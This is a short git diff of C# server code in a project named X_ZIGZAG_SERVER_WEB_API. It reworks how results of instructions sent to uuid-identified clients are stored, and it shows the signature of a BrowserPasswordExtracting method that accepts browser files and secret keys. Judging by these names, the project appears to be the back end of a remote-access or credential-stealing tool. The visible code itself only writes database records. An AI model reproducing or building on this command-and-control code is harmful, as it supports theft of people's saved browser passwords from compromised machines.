@@ -110,24 +110,19 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 await _context.SaveChangesAsync();
             }
         }
-        public async Task ResponseOutput(string uuid, long instructionId, string? output)
+        public async Task ResponseOutput(string uuid, long instructionId, short Code, string? output, string? args)
         {
-            var InstructionGet = await _context.Instructions.Where(inst => inst.ClientId.Equals(uuid) && inst.InstructionId.Equals(instructionId)).FirstOrDefaultAsync();
-            if (InstructionGet != null)
+            var result = new Result
             {
-                var result = new Result
-                {
-                    ClientId = uuid,
-                    InstructionId = instructionId,
-                    Code = InstructionGet.Code,
-                    ResultDate = DateTimeOffset.UtcNow,
-                    FunctionArgs = InstructionGet.FunctionArgs,
-                    Output= output
-                };
-                await _context.Results.AddAsync(result);
-                _context.Remove(InstructionGet);
-                await _context.SaveChangesAsync();
-            }
+                ClientId = uuid,
+                InstructionId = instructionId,
+                Code = Code,
+                ResultDate = DateTimeOffset.UtcNow,
+                FunctionArgs = args,
+                Output = output
+            };
+            await _context.Results.AddAsync(result);
+            await _context.SaveChangesAsync();
         }
         public async Task BrowserPasswordExtracting(string uuid, long instructionId, byte[] file, byte[] secretKey,string BrowserName)
         {
